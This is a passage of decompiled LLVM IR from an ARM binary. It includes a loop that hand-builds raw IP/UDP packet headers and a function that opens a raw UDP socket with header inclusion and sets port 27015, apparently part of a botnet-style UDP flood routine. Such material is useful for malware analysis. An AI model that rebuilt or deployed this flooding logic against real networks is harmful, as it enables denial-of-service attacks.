  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d560 = load i32, i32* @r5, align 4
  store i32 %v0_d560, i32* %r1.global-to-local, align 4
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v0_d568 = load i32, i32* @fp, align 4
  store i32 %v0_d568, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_d570 = load i32, i32* %ip.global-to-local, align 4
  %v6_d578 = inttoptr i32 %v0_d560 to i32*
  %v7_d578 = call i32 @function_13eec(i32 %v3_d260, i32* %v6_d578, i32 %v0_d568, i32 16384, i32 %v0_d570, i32 16)
  %v3_d57c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v1_d580 = add i32 %v3_d57c, 1
  store i32 %v1_d580, i32* %r0.global-to-local, align 4
  %v1_d584 = load i32, i32* @sl, align 4
  %v9_d584 = icmp eq i32 %v1_d580, %v1_d584
  store i1 %v9_d584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d580, i32* %stack_var_-40, align 4
  %v5_d58c = icmp slt i32 %v1_d580, %v1_d584
  br i1 %v5_d58c, label %dec_label_pc_d480, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d4e8
  %v2_d590 = icmp eq i32 %v1_d584, 0
  store i1 %v2_d590, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d470.outer

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d480
  %v1_d59c = add i32 %v2_d488, 16
  %v2_d59c = inttoptr i32 %v1_d59c to i32*
  %v3_d59c = load i32, i32* %v2_d59c, align 4
  %v0_d5a0 = call i32 @function_fe60()
  store i32 %v0_d5a0, i32* %r0.global-to-local, align 4
  %v3_d5a4 = load i32, i32* %stack_var_-40, align 4
  %v5_d5ac = mul i32 %v3_d5a4, 24
  %v1_d5b4 = load i32, i32* @r8, align 4
  %v2_d5b4 = add i32 %v1_d5b4, %v5_d5ac
  store i32 %v2_d5b4, i32* %r1.global-to-local, align 4
  %v1_d5b8 = and i32 %v3_d59c, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_d5b8, i32* %r3.global-to-local, align 4
  %v1_d5b0 = udiv i32 %v3_d59c, 256
  %v3_d5bc = and i32 %v1_d5b0, 65280
  store i32 %v3_d5bc, i32* %r2.global-to-local, align 4
  %v3_d5c0 = mul i32 %v3_d59c, 16777216
  store i32 %v3_d5c0, i32* %ip.global-to-local, align 4
  %v1_d5c4 = add i32 %v2_d5b4, 20
  %v2_d5c4 = inttoptr i32 %v1_d5c4 to i8*
  %v3_d5c4 = load i8, i8* %v2_d5c4, align 1
  %v4_d5c4 = zext i8 %v3_d5c4 to i32
  %v4_d5c8 = mul i32 %v1_d5b8, 256
  %v5_d5c8 = or i32 %v4_d5c8, %v3_d5c0
  store i32 %v5_d5c8, i32* %ip.global-to-local, align 4
  %v4_d5cc = udiv i32 %v3_d59c, 16777216
  %v5_d5cc = or i32 %v3_d5bc, %v4_d5cc
  %v2_d5d0 = or i32 %v5_d5cc, %v5_d5c8
  %v7_d5d4 = lshr i32 %v0_d5a0, %v4_d5c4
  %v8_d5d4 = add i32 %v7_d5d4, %v2_d5d0
  store i32 %v8_d5d4, i32* %r2.global-to-local, align 4
  %v3_d5e0 = mul i32 %v8_d5d4, 16777216
  %v1_d5d8 = mul i32 %v8_d5d4, 256
  %v4_d5e4 = and i32 %v1_d5d8, 16711680
  %v5_d5e4 = or i32 %v4_d5e4, %v3_d5e0
  store i32 %v5_d5e4, i32* %r1.global-to-local, align 4
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  %v2_d5f4 = call i32 @llvm.bswap.i32(i32 %v8_d5d4)
  store i32 %v2_d5f4, i32* %r3.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d5fc = load i32, i32* @r5, align 4
  %v2_d5fc = add i32 %v1_d5fc, 16
  %v3_d5fc = inttoptr i32 %v2_d5fc to i32*
  store i32 %v2_d5f4, i32* %v3_d5fc, align 4
  br i1 %v2_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d604:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  %v0_d604 = call i32 @function_fe60()
  store i32 %v0_d604, i32* %r0.global-to-local, align 4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d614, i1* %cpsr_z.global-to-local, align 1
  %v1_d618 = load i32, i32* @r5, align 4
  %v2_d618 = add i32 %v1_d618, 12
  %v3_d618 = inttoptr i32 %v2_d618 to i32*
  store i32 %v0_d604, i32* %v3_d618, align 4
  br i1 %v3_d614, label %dec_label_pc_d620, label %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge

dec_label_pc_d604.dec_label_pc_d4c4_crit_edge:    ; preds = %dec_label_pc_d604
  %v1_d4c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4c4

dec_label_pc_d620:                                ; preds = %dec_label_pc_d604, %dec_label_pc_d4b0
  %v0_d620 = call i32 @function_fe60()
  %v1_d620 = trunc i32 %v0_d620 to i8
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v4_d628 = sdiv i32 %v0_d620, 256
  store i32 %v4_d628, i32* %r3.global-to-local, align 4
  %v1_d62c = load i32, i32* @r4, align 4
  %v9_d62c = icmp eq i32 %v3_d2d4, %v1_d62c
  store i1 %v9_d62c, i1* %cpsr_z.global-to-local, align 1
  %v1_d630 = trunc i32 %v4_d628 to i8
  %v2_d630 = load i32, i32* @r5, align 4
  %v3_d630 = add i32 %v2_d630, 5
  %v4_d630 = inttoptr i32 %v3_d630 to i8*
  store i8 %v1_d630, i8* %v4_d630, align 1
  %v3_d634 = load i32, i32* @r5, align 4
  %v4_d634 = add i32 %v3_d634, 4
  %v5_d634 = inttoptr i32 %v4_d634 to i8*
  store i8 %v1_d620, i8* %v5_d634, align 1
  %v0_d638 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d638, label %dec_label_pc_d63c, label %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge

dec_label_pc_d620.dec_label_pc_d4d0_crit_edge:    ; preds = %dec_label_pc_d620
  %v1_d4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4d0

dec_label_pc_d63c:                                ; preds = %dec_label_pc_d620, %dec_label_pc_d4c4
  %v0_d63c = call i32 @function_fe60()
  %v1_d63c = trunc i32 %v0_d63c to i8
  store i32 %v0_d63c, i32* %r0.global-to-local, align 4
  %v4_d640 = sdiv i32 %v0_d63c, 256
  store i32 %v4_d640, i32* %r3.global-to-local, align 4
  %v3_d644 = load i32, i32* @r5, align 4
  %v4_d644 = add i32 %v3_d644, 20
  %v5_d644 = inttoptr i32 %v4_d644 to i8*
  store i8 %v1_d63c, i8* %v5_d644, align 1
  %v0_d648 = load i32, i32* %r3.global-to-local, align 4
  %v1_d648 = trunc i32 %v0_d648 to i8
  %v2_d648 = load i32, i32* @r6, align 4
  %v3_d648 = add i32 %v2_d648, 1
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v1_d650 = load i32, i32* @r4, align 4
  %v9_d650 = icmp eq i32 %v3_d2d8, %v1_d650
  store i1 %v9_d650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d650, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d658:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  %v0_d658 = call i32 @function_fe60()
  %v1_d658 = trunc i32 %v0_d658 to i8
  store i32 %v0_d658, i32* %r0.global-to-local, align 4
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v4_d660 = sdiv i32 %v0_d658, 256
  store i32 %v4_d660, i32* %r3.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  %v1_d668 = trunc i32 %v4_d660 to i8
  %v2_d668 = load i32, i32* @r6, align 4
  %v3_d668 = add i32 %v2_d668, 3
  %v4_d668 = inttoptr i32 %v3_d668 to i8*
  store i8 %v1_d668, i8* %v4_d668, align 1
  %v3_d66c = load i32, i32* @r6, align 4
  %v4_d66c = add i32 %v3_d66c, 2
  %v5_d66c = inttoptr i32 %v4_d66c to i8*
  store i8 %v1_d658, i8* %v5_d66c, align 1
  %v0_d670 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d670, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658
  %v0_d674 = load i32, i32* @r5, align 4
  %v1_d674 = add i32 %v0_d674, 28
  store i32 %v1_d674, i32* %r0.global-to-local, align 4
  store i32 %v0_d2b0, i32* @r1, align 4
  %v1_d67c = inttoptr i32 %v1_d674 to i8*
  %v2_d67c = call i32 @function_1003c(i8* %v1_d67c)
  store i32 %v2_d67c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4e8

dec_label_pc_d684:                                ; preds = %dec_label_pc_d270
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v1_d688 = call i32 @function_13654(i32 %v3_d260)
  store i32 %v1_d688, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d68c

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d124, %dec_label_pc_d684
  %v29_d690 = phi i32 [ %v3_d260, %dec_label_pc_d124 ], [ %v1_d688, %dec_label_pc_d684 ]
  store i32 %v18_d124, i32* %sb.global-to-local, align 4
  store i32 %v24_d124, i32* %fp.global-to-local, align 4
  ret i32 %v29_d690

dec_label_pc_d694:                                ; preds = %dec_label_pc_d2f4
  %v3_d698 = sext i8 %v5_d358 to i32
  %v7_d698 = sext i8 %v5_d35c to i32
  %v3_d69c = sdiv i32 %v3_d698, 256
  store i32 %v3_d69c, i32* %r0.global-to-local, align 4
  %v3_d6a0 = sdiv i32 %v7_d698, 256
  store i32 %v3_d6a0, i32* %r1.global-to-local, align 4
  store i32 %v1_d330, i32* %r2.global-to-local, align 4
  store i32 %v1_d334, i32* %r3.global-to-local, align 4
  %v3_d6ac34 = udiv i32 %v1_d34c, 256
  store i32 %v3_d6ac34, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d718 = sext i8 %v5_d1b4 to i32
  %sext11 = mul i32 %v1_d34c, 65536
  %v4_d770 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v0_d2c4, 16777216
  %v4_d774 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_d2c0, 16777216
  %v4_d790 = sdiv i32 %sext13, 16777216
  %v1_d77c = trunc i32 %v3_d6a0 to i8
  %v1_d798 = trunc i32 %v4_d790 to i8
  br label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d694
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d6d4 = call i32 @function_14254(i32 1510, i32 1)
  store i32 %v2_d6d4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %r1.global-to-local, align 4
  %v3_d6dc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d6dc, i32* %r2.global-to-local, align 4
  %v2_d6e0 = load i32, i32* @r6, align 4
  %v5_d6e0 = mul i32 %v2_d6e0, 4
  %v6_d6e0 = add i32 %v5_d6e0, %v2_d144
  %v7_d6e0 = inttoptr i32 %v6_d6e0 to i32*
  store i32 %v2_d6d4, i32* %v7_d6e0, align 4
  %v0_d6e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d6e4 = mul i32 %v1_d6e4, 4
  %v5_d6e4 = add i32 %v4_d6e4, %v0_d6e4
  %v6_d6e4 = inttoptr i32 %v5_d6e4 to i32*
  %v7_d6e4 = load i32, i32* %v6_d6e4, align 4
  store i32 %v7_d6e4, i32* %r1.global-to-local, align 4
  %v1_d6e8 = inttoptr i32 %v7_d6e4 to i8*
  %v2_d6e8 = load i8, i8* %v1_d6e8, align 1
  %tmp86 = urem i8 %v2_d6e8, 16
  %v1_d6ec = zext i8 %tmp86 to i32
  %v1_d6f0 = or i32 %v1_d6ec, 64
  store i32 %v1_d6f0, i32* %r3.global-to-local, align 4
  %v1_d6f4 = trunc i32 %v1_d6f0 to i8
  store i8 %v1_d6f4, i8* %v1_d6e8, align 1
  %v0_d6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6f8 = inttoptr i32 %v0_d6f8 to i8*
  %v2_d6f8 = load i8, i8* %v1_d6f8, align 1
  %v3_d6f8 = zext i8 %v2_d6f8 to i32
  %v1_d6fc = and i32 %v3_d6f8, 240
  %v1_d700 = or i32 %v1_d6fc, 5
  store i32 %v1_d700, i32* %r2.global-to-local, align 4
  %v3_d708 = add i32 %v0_d6f8, 9
  %v4_d708 = inttoptr i32 %v3_d708 to i8*
  store i8 17, i8* %v4_d708, align 1
  %v0_d70c = load i32, i32* %r2.global-to-local, align 4
  %v1_d70c = trunc i32 %v0_d70c to i8
  %v2_d70c = load i32, i32* %r1.global-to-local, align 4
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  store i8 %v1_d70c, i8* %v3_d70c, align 1
  %v2_d714 = load i32, i32* %r1.global-to-local, align 4
  %v3_d714 = add i32 %v2_d714, 1
  %v4_d714 = inttoptr i32 %v3_d714 to i8*
  store i8 %v5_d17c, i8* %v4_d714, align 1
  store i32 %v4_d718, i32* %r0.global-to-local, align 4
  %v2_d71c = load i32, i32* %r1.global-to-local, align 4
  %v3_d71c = add i32 %v2_d71c, 8
  %v4_d71c = inttoptr i32 %v3_d71c to i8*
  store i8 %v5_d1b4, i8* %v4_d71c, align 1
  %v3_d720 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d720, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d728 = mul i32 %v3_d720, 32
  store i32 %v3_d728, i32* %r3.global-to-local, align 4
  %v1_d72c = load i32, i32* %r1.global-to-local, align 4
  %v2_d72c = add i32 %v1_d72c, 12
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v6_d24c, i32* %v3_d72c, align 4
  %v0_d730 = load i32, i32* %r3.global-to-local, align 4
  %v1_d730 = load i32, i32* %r2.global-to-local, align 4
  %tmp87 = mul i32 %v1_d730, -8
  %v5_d730 = add i32 %v0_d730, %tmp87
  %v1_d734 = load i32, i32* @r8, align 4
  %v2_d734 = add i32 %v5_d730, %v1_d734
  store i32 %v2_d734, i32* %r3.global-to-local, align 4
  %v1_d738 = add i32 %v2_d734, 16
  %v2_d738 = inttoptr i32 %v1_d738 to i32*
  %v3_d738 = load i32, i32* %v2_d738, align 4
  store i32 %v3_d738, i32* %ip.global-to-local, align 4
  %v1_d73c = add i32 %v1_d730, 1
  store i32 %v1_d73c, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d748 = load i32, i32* %r1.global-to-local, align 4
  %v3_d748 = add i32 %v2_d748, 6
  %v4_d748 = inttoptr i32 %v3_d748 to i8*
  store i8 64, i8* %v4_d748, align 1
  %v0_d74c = load i32, i32* %r2.global-to-local, align 4
  %v1_d74c = trunc i32 %v0_d74c to i8
  %v2_d74c = load i32, i32* %r1.global-to-local, align 4
  %v3_d74c = add i32 %v2_d74c, 7
  %v4_d74c = inttoptr i32 %v3_d74c to i8*
  store i8 %v1_d74c, i8* %v4_d74c, align 1
  %v0_d750 = load i32, i32* %ip.global-to-local, align 4
  %v1_d750 = load i32, i32* %r1.global-to-local, align 4
  %v2_d750 = add i32 %v1_d750, 16
  %v3_d750 = inttoptr i32 %v2_d750 to i32*
  store i32 %v0_d750, i32* %v3_d750, align 4
  store i32 %v3_d69c, i32* %r3.global-to-local, align 4
  store i32 %v7_d698, i32* %ip.global-to-local, align 4
  %v2_d760 = load i32, i32* %r1.global-to-local, align 4
  %v3_d760 = add i32 %v2_d760, 2
  %v4_d760 = inttoptr i32 %v3_d760 to i8*
  store i8 %v5_d358, i8* %v4_d760, align 1
  %v0_d764 = load i32, i32* %r3.global-to-local, align 4
  %v1_d764 = trunc i32 %v0_d764 to i8
  %v2_d764 = load i32, i32* %r1.global-to-local, align 4
  %v3_d764 = add i32 %v2_d764, 3
  %v4_d764 = inttoptr i32 %v3_d764 to i8*
  store i8 %v1_d764, i8* %v4_d764, align 1
  %v0_d768 = load i32, i32* %ip.global-to-local, align 4
  %v1_d768 = trunc i32 %v0_d768 to i8
  %v2_d768 = load i32, i32* %r1.global-to-local, align 4
  %v3_d768 = add i32 %v2_d768, 4
  %v4_d768 = inttoptr i32 %v3_d768 to i8*
  store i8 %v1_d768, i8* %v4_d768, align 1
  store i32 %v3_d6a0, i32* %r2.global-to-local, align 4
  store i32 %v4_d770, i32* %r3.global-to-local, align 4
  store i32 %v4_d774, i32* %ip.global-to-local, align 4
  %v0_d778 = load i32, i32* %r1.global-to-local, align 4
  %v1_d778 = add i32 %v0_d778, 20
  store i32 %v1_d778, i32* %r0.global-to-local, align 4
  %v3_d77c = add i32 %v0_d778, 5
  %v4_d77c = inttoptr i32 %v3_d77c to i8*
  store i8 %v1_d77c, i8* %v4_d77c, align 1
  %v0_d780 = load i32, i32* @r4, align 4
  %v1_d780 = trunc i32 %v0_d780 to i8
  %v2_d780 = load i32, i32* %r1.global-to-local, align 4
  %v3_d780 = add i32 %v2_d780, 20
  %v4_d780 = inttoptr i32 %v3_d780 to i8*
  store i8 %v1_d780, i8* %v4_d780, align 1
  %v0_d784 = load i32, i32* %r3.global-to-local, align 4
  %v1_d784 = trunc i32 %v0_d784 to i8
  %v2_d784 = load i32, i32* %r0.global-to-local, align 4
  %v3_d784 = add i32 %v2_d784, 5
  %v4_d784 = inttoptr i32 %v3_d784 to i8*
  store i8 %v1_d784, i8* %v4_d784, align 1
  %v0_d788 = load i32, i32* %ip.global-to-local, align 4
  %v1_d788 = trunc i32 %v0_d788 to i8
  %v2_d788 = load i32, i32* %r0.global-to-local, align 4
  %v3_d788 = add i32 %v2_d788, 1
  %v4_d788 = inttoptr i32 %v3_d788 to i8*
  store i8 %v1_d788, i8* %v4_d788, align 1
  %v0_d78c = load i32, i32* @r5, align 4
  %v1_d78c = trunc i32 %v0_d78c to i8
  %v2_d78c = load i32, i32* %r0.global-to-local, align 4
  %v3_d78c = add i32 %v2_d78c, 2
  %v4_d78c = inttoptr i32 %v3_d78c to i8*
  store i8 %v1_d78c, i8* %v4_d78c, align 1
  store i32 %v4_d790, i32* %r1.global-to-local, align 4
  %v0_d794 = load i32, i32* @r6, align 4
  %v1_d794 = load i32, i32* @sl, align 4
  %v9_d794 = icmp eq i32 %v0_d794, %v1_d794
  store i1 %v9_d794, i1* %cpsr_z.global-to-local, align 1
  %v2_d798 = load i32, i32* %r0.global-to-local, align 4
  %v3_d798 = add i32 %v2_d798, 3
  %v4_d798 = inttoptr i32 %v3_d798 to i8*
  store i8 %v1_d798, i8* %v4_d798, align 1
  %v0_d79c = load i32, i32* @r7, align 4
  %v1_d79c = trunc i32 %v0_d79c to i8
  %v2_d79c = load i32, i32* %r0.global-to-local, align 4
  %v3_d79c = add i32 %v2_d79c, 4
  %v4_d79c = inttoptr i32 %v3_d79c to i8*
  store i8 %v1_d79c, i8* %v4_d79c, align 1
  %v0_d7a0 = load i32, i32* @r6, align 4
  store i32 %v0_d7a0, i32* %stack_var_-40, align 4
  %v5_d7a4 = icmp slt i32 %v0_d794, %v1_d794
  br i1 %v5_d7a4, label %dec_label_pc_d6c8, label %dec_label_pc_d468

; uselistorder directives
  uselistorder i32 %v1_d730, { 1, 0 }
  uselistorder i32 %v3_d6a0, { 2, 1, 0 }
  uselistorder i32 %v3_d69c, { 1, 0 }
  uselistorder i32 %v7_d698, { 1, 0 }
  uselistorder i32 %v4_d660, { 1, 0 }
  uselistorder i32 %v0_d658, { 0, 2, 1 }
  uselistorder i32 %v0_d63c, { 0, 2, 1 }
  uselistorder i32 %v4_d628, { 1, 0 }
  uselistorder i32 %v0_d620, { 0, 2, 1 }
  uselistorder i32 %v2_d5f4, { 1, 0 }
  uselistorder i32 %v8_d5d4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_d5c0, { 1, 0 }
  uselistorder i32 %v3_d59c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_d590, { 1, 0 }
  uselistorder i32 %v1_d584, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d580, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_d528, { 0, 2, 1 }
  uselistorder i32 %v0_d510, { 1, 0, 2, 3 }
  uselistorder i32 %v4_d4fc, { 1, 0 }
  uselistorder i32 %v2_d4f8, { 0, 2, 1 }
  uselistorder i1 %v7_d4a8, { 2, 1, 0 }
  uselistorder i1 %v3_d614, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d36c36, { 1, 0 }
  uselistorder i8 %v5_d358, { 0, 2, 1 }
  uselistorder i32 %v3_d344, { 1, 0 }
  uselistorder i32 %v1_d334, { 2, 3, 0, 1 }
  uselistorder i32 %v1_d330, { 1, 2, 0 }
  uselistorder i32 %v1_d328, { 1, 0, 2 }
  uselistorder i32 %v1_d320, { 1, 0 }
  uselistorder i32 %v1_d2f8, { 1, 0, 2 }
  uselistorder i32 %v3_d2d8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_d2b8, { 2, 1, 4, 3, 0 }
  uselistorder i32 %v0_d2b4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_d2b0, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_d2a4, { 3, 1, 2, 0 }
  uselistorder i1 %v7_d290, { 1, 0 }
  uselistorder i1 %v7_d264, { 1, 0 }
  uselistorder i32 %v3_d260, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_d24c, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_d238, { 3, 1, 2, 0 }
  uselistorder i32 %v1_d1c4, { 1, 0 }
  uselistorder i8 %v5_d1b4, { 1, 0, 2 }
  uselistorder i32 %v5_d198, { 1, 0 }
  uselistorder i8 %v5_d17c, { 0, 2, 1 }
  uselistorder i32 %v6_d15c, { 1, 0 }
  uselistorder i32 %v2_d144, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_d128, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 48, 47, 49, 50, 52, 51, 54, 53, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 14, 13, 15, 16, 17, 19, 18, 21, 20, 22, 24, 23, 30, 25, 26, 27, 28, 29, 35, 31, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i8*)* @function_1003c, { 0, 1, 2, 7, 3, 4, 5, 6 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_d68c, { 1, 0 }
  uselistorder label %dec_label_pc_d674, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d470, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_d7b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d7b0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_d7b0 = load i32, i32* @r4, align 4
  %v12_d7b0 = load i32, i32* @r7, align 4
  %v1_d7b4 = urem i32 %arg1, 256
  store i32 %v1_d7b4, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_d7c8 = urem i32 %arg3, 256
  store i32 %v1_d7c8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_d7d0 = call i32 @function_14254(i32 %v1_d7b4, i32 4)
  %v0_d7d4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d7e0 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d7e8 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e8 = call i32 @function_a4e8(i32 %v0_d7e0, i32* %v5_d7e8, i32 2, i32 0)
  %v1_d7f4 = urem i32 %v6_d7e8, 256
  store i32 %v1_d7f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d800 = load i32, i32* @r4, align 4
  %v0_d804 = load i32, i32* @r5, align 4
  %v5_d808 = trunc i32 %v6_d7e8 to i8
  %v6_d80c = inttoptr i32 %v0_d804 to i32*
  %v7_d80c = call i32 @function_a4e8(i32 %v0_d800, i32* %v6_d80c, i32 3, i32 65535)
  %v0_d810 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d80c, i32* @r7, align 4
  %v0_d820 = load i32, i32* @r4, align 4
  %v4_d824 = inttoptr i32 %v0_d810 to i32*
  %v5_d824 = call i32 @function_a4e8(i32 %v0_d820, i32* %v4_d824, i32 4, i32 64)
  %v1_d82c = urem i32 %v5_d824, 256
  store i32 %v1_d82c, i32* %ip.global-to-local, align 4
  %v0_d830 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d83c = load i32, i32* @r4, align 4
  %v5_d840 = trunc i32 %v5_d824 to i8
  %v6_d844 = inttoptr i32 %v0_d830 to i32*
  %v7_d844 = call i32 @function_a4e8(i32 %v0_d83c, i32* %v6_d844, i32 5, i32 0)
  %v1_d850 = urem i32 %v7_d844, 256
  store i32 %v1_d850, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d85c = load i32, i32* @r4, align 4
  %v0_d860 = load i32, i32* @r5, align 4
  %v5_d868 = inttoptr i32 %v0_d860 to i32*
  %v6_d868 = call i32 @function_a4e8(i32 %v0_d85c, i32* %v5_d868, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d878 = load i32, i32* @r5, align 4
  store i32 %v6_d868, i32* @r6, align 4
  %v0_d880 = load i32, i32* @r4, align 4
  %v4_d884 = inttoptr i32 %v0_d878 to i32*
  %v5_d884 = call i32 @function_a4e8(i32 %v0_d880, i32* %v4_d884, i32 7, i32 27015)
  store i32 %v5_d884, i32* @r4, align 4
  %v1_d890 = call i32 @function_1236c(i32 29)
  %v3_d89c = call i32 @function_12288(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_d89c, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d8b0 = call i32 @function_13f50(i32 2, i32 3, i32 17)
  %v7_d8b4 = icmp eq i32 %v3_d8b0, -1
  store i1 %v7_d8b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d8b0, i32* %fp.global-to-local, align 4
  br i1 %v7_d8b4, label %dec_label_pc_dc68, label %dec_label_pc_d8c0

dec_label_pc_d8c0:                                ; preds = %dec_label_pc_d7b0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d8c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d8c8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d8dc = call i32 @function_13f20(i32 %v3_d8b0, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_d8e0 = icmp eq i32 %v6_d8dc, -1
